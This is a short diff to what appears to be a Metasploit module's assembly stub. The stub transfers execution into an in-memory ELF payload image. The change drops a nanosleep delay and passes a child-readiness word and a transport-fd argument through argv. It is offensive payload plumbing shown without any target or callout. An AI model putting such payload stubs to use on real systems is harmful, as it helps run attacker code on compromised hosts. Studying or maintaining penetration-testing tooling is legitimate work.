@@ -15,26 +15,15 @@ module Msf
       entry_offset = elf_entry_point(opts.fetch(:payload))
 
       %(
+      pop r14                    ; child-readiness word
       pop rax                    ; discard source pid
       pop rax                    ; discard source transport fd
       pop rsi                    ; process image address
 
-      ; Let the source HTTP transport finish its request before the child
-      ; starts polling the same passive URL.
-      push rsi
-      sub rsp, 16
-      mov qword [rsp], 2
-      mov qword [rsp + 8], 0
-      mov rdi, rsp
-      xor esi, esi
-      mov eax, 35                ; nanosleep({ 2, 0 }, NULL)
-      syscall
-      add rsp, 16
-      pop rsi
-
       and rsp, -16
       add rsp, 128
-      mov eax, 0x61              ; argv[0] = "a"
+      sub rsp, 8                ; account for the third argv entry
+      mov eax, 0x6d              ; argv[0] = "m"
       push rax
       mov rcx, rsp
 
@@ -45,8 +34,10 @@ module Msf
       push 7                     ; AT_BASE type
       push rbx                   ; envp terminator
       push rbx                   ; argv terminator
+      push r14                   ; argv[2] = child-readiness word
+      push -1                    ; argv[1] = no inherited transport fd
       push rcx                   ; argv[0]
-      push 1                     ; argc
+      push 3                     ; argc
 
       add rsi, #{entry_offset}
       jmp rsi
